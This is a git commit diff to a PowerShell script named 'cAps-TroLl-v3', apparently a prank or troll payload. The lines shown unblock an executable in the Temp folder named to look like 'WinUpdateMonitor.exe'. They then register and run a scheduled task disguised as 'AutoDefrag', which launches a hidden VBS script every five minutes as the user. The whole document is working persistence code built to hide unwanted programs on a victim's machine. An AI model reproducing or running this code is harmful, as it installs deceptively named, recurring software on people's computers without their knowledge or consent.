925b5c8587ca9c2aee2a465d293b7eb6e8838cf8
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-31 09:49:18 +0200

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -8,6 +8,6 @@ Remove-Item -Path $env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166.zip -Force
 Start-Sleep 1;
 Unblock-File -Path "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\WinUpdateMonitor.exe"
 Start-Sleep 1;
-schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
+schtasks /create /tn "AutoDefrag" /tr "wscript.exe `"$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\managed.vbs"`" /sc MINUTE /mo 5 /ru "$env:USERNAME" /f;
 schtasks /run /tn "AutoDefrag"
 exit
